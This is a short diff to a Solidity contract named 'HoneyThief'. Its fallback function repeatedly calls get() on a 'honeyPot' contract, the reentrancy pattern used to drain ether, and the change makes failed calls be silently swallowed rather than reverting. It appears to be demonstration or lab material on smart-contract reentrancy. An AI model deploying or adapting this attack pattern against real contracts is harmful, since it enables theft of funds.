@@ -12,7 +12,11 @@ contract HoneyThief {
 
     function() external payable {
         emit LogFallback(msg.sender, msg.value, address(this).balance);
-        honeyPot.call(abi.encodeWithSignature("get()", ""));
+        bool success = honeyPot.call(abi.encodeWithSignature("get()", ""));
+
+        if(!success) {
+            //Eat the failure. Do not revert. 
+        }
     }
 
     function put() public payable {
